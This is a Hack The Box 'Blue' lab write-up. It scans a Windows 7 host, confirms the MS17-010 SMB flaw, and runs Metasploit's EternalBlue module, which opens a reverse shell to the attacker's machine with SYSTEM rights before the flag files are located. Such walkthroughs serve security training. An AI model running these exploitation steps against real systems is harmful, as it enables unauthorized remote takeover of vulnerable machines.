# HTB - Blue
## OS - Windows

I started with an nmap scan of Blue (IP address: 10.10.10.40)

```
$nmap -sC -sV -oN Blue.nmap 10.10.10.40
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-28 18:03 PST
Nmap scan report for 10.10.10.40
Host is up (0.091s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3m43s, deviation: 1s, median: 3m42s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-12-29T02:08:24+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-12-29T02:08:25
|_  start_date: 2020-12-29T02:06:18

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Basically SMB services are open. So I ran another nmap scan with safe scripts option.

```
$nmap -p 139,445 --script safe 10.10.10.40
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-28 18:05 PST
Pre-scan script results:
|_broadcast-wpad-discover: Failed to retrieve wpad.dat (http://wpad.net/wpad.dat) from server
| targets-asn: 
|_  targets-asn.asn is a mandatory parameter
Nmap scan report for 10.10.10.40
Host is up (0.095s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_clock-skew: mean: 3m44s, deviation: 3s, median: 3m42s
|_fcrdns: FAIL (No PTR record)
| msrpc-enum: 
|   
|     uuid: d95afe70-a6d5-4259-822e-2c84da1ddb0d
|     tcp_port: 49152
|     ip_addr: 0.0.0.0
|   
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|     ncacn_np: \pipe\lsass
|     exe: lsass.exe samr interface
|     netbios: \\HARIS-PC
|   
|     ncalrpc: LRPC-2f21cbd1c633abe247
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|     exe: lsass.exe samr interface
|   
|     ncalrpc: audit
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|     exe: lsass.exe samr interface
|   
|     ncalrpc: securityevent
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|     exe: lsass.exe samr interface
|   
|     ncalrpc: LSARPC_ENDPOINT
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|     exe: lsass.exe samr interface
|   
|     ncalrpc: lsapolicylookup
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|     exe: lsass.exe samr interface
|   
|     ncalrpc: lsasspirpc
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|     exe: lsass.exe samr interface
|   
|     ncalrpc: protected_storage
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|     exe: lsass.exe samr interface
|   
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|     ncacn_np: \PIPE\protected_storage
|     exe: lsass.exe samr interface
|     netbios: \\HARIS-PC
|   
|     ncalrpc: samss lpc
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|     exe: lsass.exe samr interface
|   
|     uuid: 12345778-1234-abcd-ef00-0123456789ac
|     exe: lsass.exe samr interface
|     ip_addr: 0.0.0.0
|     tcp_port: 49157
|   
|     ncalrpc: LRPC-a4149cdb5ca6ce8640
|     uuid: 906b0ce0-c70b-1067-b317-00dd010662da
|   
|     ncalrpc: LRPC-a4149cdb5ca6ce8640
|     uuid: 906b0ce0-c70b-1067-b317-00dd010662da
|   
|     ncalrpc: LRPC-a4149cdb5ca6ce8640
|     uuid: 906b0ce0-c70b-1067-b317-00dd010662da
|   
|     ncalrpc: LRPC-a4149cdb5ca6ce8640
|     uuid: 906b0ce0-c70b-1067-b317-00dd010662da
|   
|     ncalrpc: OLE1BE72AEAE468458EB6E54B7861E0
|     uuid: 906b0ce0-c70b-1067-b317-00dd010662da
|   
|     ncalrpc: LRPC-ad81f8c4ed42b728f3
|     uuid: 906b0ce0-c70b-1067-b317-00dd010662da
|   
|     uuid: 6b5bdd1e-528c-422c-af8c-a4079be4fe48
|     annotation: Remote Fw APIs
|     tcp_port: 49156
|     ip_addr: 0.0.0.0
|   
|     uuid: 12345678-1234-abcd-ef00-0123456789ab
|     annotation: IPSec Policy agent endpoint
|     tcp_port: 49156
|     ip_addr: 0.0.0.0
|   
|     ncalrpc: LRPC-6264d69ceab8b6fb73
|     uuid: 12345678-1234-abcd-ef00-0123456789ab
|     annotation: IPSec Policy agent endpoint
|   
|     uuid: 367abb81-9844-35f1-ad32-98f038001003
|     tcp_port: 49155
|     ip_addr: 0.0.0.0
|   
|     ncalrpc: OLEFBCE0057E16C41ABAF5DC109ADB2
|     uuid: 0767a036-0d22-48aa-ba69-b619480f38cb
|     annotation: PcaSvc
|   
|     ncalrpc: LRPC-0ce3d5fc9c69036d75
|     uuid: 0767a036-0d22-48aa-ba69-b619480f38cb
|     annotation: PcaSvc
|   
|     ncalrpc: OLEFBCE0057E16C41ABAF5DC109ADB2
|     uuid: b58aa02e-2884-4e97-8176-4ee06d794184
|   
|     ncalrpc: LRPC-0ce3d5fc9c69036d75
|     uuid: b58aa02e-2884-4e97-8176-4ee06d794184
|   
|     uuid: b58aa02e-2884-4e97-8176-4ee06d794184
|     ncacn_np: \pipe\trkwks
|     netbios: \\HARIS-PC
|   
|     ncalrpc: trkwks
|     uuid: b58aa02e-2884-4e97-8176-4ee06d794184
|   
|     ncalrpc: LRPC-8f2443c5e7b907e3fc
|     uuid: dd490425-5325-4565-b774-7e27d6c09c24
|     annotation: Base Firewall Engine API
|   
|     ncalrpc: LRPC-8f2443c5e7b907e3fc
|     uuid: 7f9d11bf-7fb9-436b-a812-b2d50c5d4c03
|     annotation: Fw APIs
|   
|     ncalrpc: LRPC-8f2443c5e7b907e3fc
|     uuid: 2fb92682-6599-42dc-ae13-bd2ca89bd11c
|     annotation: Fw APIs
|   
|     ncalrpc: spoolss
|     uuid: 0b6edbfa-4a24-4fc6-8a23-942b1eca65d1
|     annotation: Spooler function endpoint
|   
|     ncalrpc: spoolss
|     uuid: ae33069b-a2a8-46ee-a235-ddfd339be281
|     annotation: Spooler base remote object endpoint
|   
|     ncalrpc: spoolss
|     uuid: 4a452661-8290-4b36-8fbe-7f4093a94978
|     annotation: Spooler function endpoint
|   
|     ncalrpc: LRPC-898d5e9f1b4d807f09
|     uuid: 24019106-a203-4642-b88d-82dae9158929
|   
|     ncalrpc: OLEACB337FF74444719A9B8C8135350
|     uuid: 7ea70bcf-48af-4f6a-8968-6a440754d5fa
|     annotation: NSI server endpoint
|   
|     ncalrpc: LRPC-18a1aa3f49c55ef48d
|     uuid: 7ea70bcf-48af-4f6a-8968-6a440754d5fa
|     annotation: NSI server endpoint
|   
|     ncalrpc: OLEACB337FF74444719A9B8C8135350
|     uuid: 3473dd4d-2e88-4006-9cba-22570909dd10
|     annotation: WinHttp Auto-Proxy Service
|   
|     ncalrpc: LRPC-18a1aa3f49c55ef48d
|     uuid: 3473dd4d-2e88-4006-9cba-22570909dd10
|     annotation: WinHttp Auto-Proxy Service
|   
|     ncalrpc: IUserProfile2
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|     annotation: Impl friendly name
|   
|     ncalrpc: IUserProfile2
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|     annotation: Impl friendly name
|   
|     ncalrpc: IUserProfile2
|     uuid: 2eb08e3e-639f-4fba-97b1-14f878961076
|   
|     ncalrpc: IUserProfile2
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|     annotation: Impl friendly name
|   
|     ncalrpc: OLE7C794D71DE074999B5DD9B496DB4
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|     annotation: Impl friendly name
|   
|     ncalrpc: senssvc
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|     annotation: Impl friendly name
|   
|     ncalrpc: IUserProfile2
|     uuid: 0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53
|   
|     ncalrpc: OLE7C794D71DE074999B5DD9B496DB4
|     uuid: 0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53
|   
|     ncalrpc: senssvc
|     uuid: 0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53
|   
|     ncalrpc: IUserProfile2
|     uuid: 1ff70682-0a51-30e8-076d-740be8cee98b
|     exe: mstask.exe atsvc interface (Scheduler service)
|   
|     ncalrpc: OLE7C794D71DE074999B5DD9B496DB4
|     uuid: 1ff70682-0a51-30e8-076d-740be8cee98b
|     exe: mstask.exe atsvc interface (Scheduler service)
|   
|     ncalrpc: senssvc
|     uuid: 1ff70682-0a51-30e8-076d-740be8cee98b
|     exe: mstask.exe atsvc interface (Scheduler service)
|   
|     uuid: 1ff70682-0a51-30e8-076d-740be8cee98b
|     ncacn_np: \PIPE\atsvc
|     exe: mstask.exe atsvc interface (Scheduler service)
|     netbios: \\HARIS-PC
|   
|     ncalrpc: IUserProfile2
|     uuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f
|   
|     ncalrpc: OLE7C794D71DE074999B5DD9B496DB4
|     uuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f
|   
|     ncalrpc: senssvc
|     uuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f
|   
|     uuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f
|     ncacn_np: \PIPE\atsvc
|     netbios: \\HARIS-PC
|   
|     ncalrpc: IUserProfile2
|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
|   
|     ncalrpc: OLE7C794D71DE074999B5DD9B496DB4
|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
|   
|     ncalrpc: senssvc
|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
|   
|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
|     ncacn_np: \PIPE\atsvc
|     netbios: \\HARIS-PC
|   
|     uuid: 86d35949-83c9-4044-b424-db363231fd0c
|     tcp_port: 49154
|     ip_addr: 0.0.0.0
|   
|     ncalrpc: IUserProfile2
|     uuid: a398e520-d59a-4bdd-aa7a-3c1e0303a511
|     annotation: IKE/Authip API
|   
|     ncalrpc: OLE7C794D71DE074999B5DD9B496DB4
|     uuid: a398e520-d59a-4bdd-aa7a-3c1e0303a511
|     annotation: IKE/Authip API
|   
|     ncalrpc: senssvc
|     uuid: a398e520-d59a-4bdd-aa7a-3c1e0303a511
|     annotation: IKE/Authip API
|   
|     uuid: a398e520-d59a-4bdd-aa7a-3c1e0303a511
|     annotation: IKE/Authip API
|     ncacn_np: \PIPE\atsvc
|     netbios: \\HARIS-PC
|   
|     uuid: a398e520-d59a-4bdd-aa7a-3c1e0303a511
|     annotation: IKE/Authip API
|     tcp_port: 49154
|     ip_addr: 0.0.0.0
|   
|     ncalrpc: IUserProfile2
|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
|     annotation: IP Transition Configuration endpoint
|   
|     ncalrpc: OLE7C794D71DE074999B5DD9B496DB4
|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
|     annotation: IP Transition Configuration endpoint
|   
|     ncalrpc: senssvc
|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
|     annotation: IP Transition Configuration endpoint
|   
|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
|     annotation: IP Transition Configuration endpoint
|     ncacn_np: \PIPE\atsvc
|     netbios: \\HARIS-PC
|   
|     uuid: 552d076a-cb29-4e44-8b6a-d15e59e2c0af
|     annotation: IP Transition Configuration endpoint
|     tcp_port: 49154
|     ip_addr: 0.0.0.0
|   
|     ncalrpc: IUserProfile2
|     uuid: 98716d03-89ac-44c7-bb8c-285824e51c4a
|     annotation: XactSrv service
|   
|     ncalrpc: OLE7C794D71DE074999B5DD9B496DB4
|     uuid: 98716d03-89ac-44c7-bb8c-285824e51c4a
|     annotation: XactSrv service
|   
|     ncalrpc: senssvc
|     uuid: 98716d03-89ac-44c7-bb8c-285824e51c4a
|     annotation: XactSrv service
|   
|     uuid: 98716d03-89ac-44c7-bb8c-285824e51c4a
|     annotation: XactSrv service
|     ncacn_np: \PIPE\atsvc
|     netbios: \\HARIS-PC
|   
|     uuid: 98716d03-89ac-44c7-bb8c-285824e51c4a
|     annotation: XactSrv service
|     tcp_port: 49154
|     ip_addr: 0.0.0.0
|   
|     ncalrpc: eventlog
|     uuid: f6beaff7-1e19-4fbb-9f8f-b89e2018337c
|     annotation: Event log TCPIP
|   
|     uuid: f6beaff7-1e19-4fbb-9f8f-b89e2018337c
|     annotation: Event log TCPIP
|     ncacn_np: \pipe\eventlog
|     netbios: \\HARIS-PC
|   
|     uuid: f6beaff7-1e19-4fbb-9f8f-b89e2018337c
|     annotation: Event log TCPIP
|     tcp_port: 49153
|     ip_addr: 0.0.0.0
|   
|     ncalrpc: eventlog
|     uuid: 30adc50c-5cbc-46ce-9a0e-91914789e23c
|     annotation: NRP server endpoint
|   
|     uuid: 30adc50c-5cbc-46ce-9a0e-91914789e23c
|     annotation: NRP server endpoint
|     ncacn_np: \pipe\eventlog
|     netbios: \\HARIS-PC
|   
|     uuid: 30adc50c-5cbc-46ce-9a0e-91914789e23c
|     annotation: NRP server endpoint
|     tcp_port: 49153
|     ip_addr: 0.0.0.0
|   
|     ncalrpc: AudioClientRpc
|     uuid: 30adc50c-5cbc-46ce-9a0e-91914789e23c
|     annotation: NRP server endpoint
|   
|     ncalrpc: Audiosrv
|     uuid: 30adc50c-5cbc-46ce-9a0e-91914789e23c
|     annotation: NRP server endpoint
|   
|     ncalrpc: eventlog
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5
|     annotation: DHCP Client LRPC Endpoint
|   
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5
|     annotation: DHCP Client LRPC Endpoint
|     ncacn_np: \pipe\eventlog
|     netbios: \\HARIS-PC
|   
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5
|     annotation: DHCP Client LRPC Endpoint
|     tcp_port: 49153
|     ip_addr: 0.0.0.0
|   
|     ncalrpc: AudioClientRpc
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5
|     annotation: DHCP Client LRPC Endpoint
|   
|     ncalrpc: Audiosrv
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5
|     annotation: DHCP Client LRPC Endpoint
|   
|     ncalrpc: dhcpcsvc
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5
|     annotation: DHCP Client LRPC Endpoint
|   
|     ncalrpc: eventlog
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6
|     annotation: DHCPv6 Client LRPC Endpoint
|   
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6
|     annotation: DHCPv6 Client LRPC Endpoint
|     ncacn_np: \pipe\eventlog
|     netbios: \\HARIS-PC
|   
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6
|     annotation: DHCPv6 Client LRPC Endpoint
|     tcp_port: 49153
|     ip_addr: 0.0.0.0
|   
|     ncalrpc: AudioClientRpc
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6
|     annotation: DHCPv6 Client LRPC Endpoint
|   
|     ncalrpc: Audiosrv
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6
|     annotation: DHCPv6 Client LRPC Endpoint
|   
|     ncalrpc: dhcpcsvc
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6
|     annotation: DHCPv6 Client LRPC Endpoint
|   
|     ncalrpc: dhcpcsvc6
|     uuid: 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6
|     annotation: DHCPv6 Client LRPC Endpoint
|   
|     ncalrpc: eventlog
|     uuid: 06bba54a-be05-49f9-b0a0-30f790261023
|     annotation: Security Center
|   
|     uuid: 06bba54a-be05-49f9-b0a0-30f790261023
|     annotation: Security Center
|     ncacn_np: \pipe\eventlog
|     netbios: \\HARIS-PC
|   
|     uuid: 06bba54a-be05-49f9-b0a0-30f790261023
|     annotation: Security Center
|     tcp_port: 49153
|     ip_addr: 0.0.0.0
|   
|     ncalrpc: AudioClientRpc
|     uuid: 06bba54a-be05-49f9-b0a0-30f790261023
|     annotation: Security Center
|   
|     ncalrpc: Audiosrv
|     uuid: 06bba54a-be05-49f9-b0a0-30f790261023
|     annotation: Security Center
|   
|     ncalrpc: dhcpcsvc
|     uuid: 06bba54a-be05-49f9-b0a0-30f790261023
|     annotation: Security Center
|   
|     ncalrpc: dhcpcsvc6
|     uuid: 06bba54a-be05-49f9-b0a0-30f790261023
|     annotation: Security Center
|   
|     ncalrpc: OLEBA8C4216CC484FAFA4EB1A569B35
|     uuid: 06bba54a-be05-49f9-b0a0-30f790261023
|     annotation: Security Center
|   
|     ncalrpc: WMsgKRpc08C361
|     uuid: 76f226c3-ec14-4325-8a99-6a46348418af
|   
|     ncalrpc: LRPC-faea5fb13d18537160
|     uuid: c9ac6db5-82b7-4e55-ae8a-e464ed7b4277
|     annotation: Impl friendly name
|   
|     ncalrpc: WMsgKRpc08C1C0
|     uuid: 76f226c3-ec14-4325-8a99-6a46348418af
|   
|     uuid: 76f226c3-ec14-4325-8a99-6a46348418af
|     ncacn_np: \PIPE\InitShutdown
|     netbios: \\HARIS-PC
|   
|     ncalrpc: WindowsShutdown
|     uuid: 76f226c3-ec14-4325-8a99-6a46348418af
|   
|     ncalrpc: WMsgKRpc08C1C0
|     uuid: d95afe70-a6d5-4259-822e-2c84da1ddb0d
|   
|     uuid: d95afe70-a6d5-4259-822e-2c84da1ddb0d
|     ncacn_np: \PIPE\InitShutdown
|     netbios: \\HARIS-PC
|   
|     ncalrpc: WindowsShutdown
|_    uuid: d95afe70-a6d5-4259-822e-2c84da1ddb0d
| smb-mbenum: 
|   Master Browser
|     HARIS-PC  6.1  
|   Potential Browser
|     HARIS-PC  6.1  
|   Server service
|     HARIS-PC  6.1  
|   Windows NT/2000/XP/2003 server
|     HARIS-PC  6.1  
|   Workstation
|_    HARIS-PC  6.1  
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-12-29T02:10:04+00:00
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.02
|_    2.10
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
| smb2-capabilities: 
|   2.02: 
|     Distributed File System
|   2.10: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-12-29T02:10:00
|_  start_date: 2020-12-29T02:06:18
| unusual-port: 
|_  WARNING: this script depends on Nmap's service/version detection (-sV)

Post-scan script results:
| reverse-index: 
|   139/tcp: 10.10.10.40
|_  445/tcp: 10.10.10.40
Nmap done: 1 IP address (1 host up) scanned in 73.41 seconds
```

Out of the results, MS17-010 stood out. The CVE details show that this is related to Double Pulsar vuln.

Searching in msfconsole shows Eternal Blue and Double Pulsar exploits.

```
msf5 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution



```
The first two results were Auxilliary modules, so I decided to go ahead with exploit/windows/smb/ms17_010_eternalblue.

After that, it was pretty straightforward to get a shell.

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf5 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 17 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.14.12:4444 -> 10.10.10.40:49158) at 2020-12-28 18:18:30 -0800
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=



C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>dir
```
After that, it was time to get the flags.

```
C:\Users\haris>cd Desktop
dircd Desktop


C:\Users\haris\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\haris\Desktop

24/12/2017  02:23    <DIR>          .
24/12/2017  02:23    <DIR>          ..
21/07/2017  06:54                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,739,019,264 bytes free

C:\Users\haris\Desktop>type user.txt

C:\Users\Administrator\Desktop>
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\Administrator\Desktop

24/12/2017  02:22    <DIR>          .
24/12/2017  02:22    <DIR>          ..
21/07/2017  06:57                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,737,970,688 bytes free

C:\Users\Administrator\Desktop>type root.txt

```

To do this without metasploit, there are quite a few public exploits available for EternalBlue.




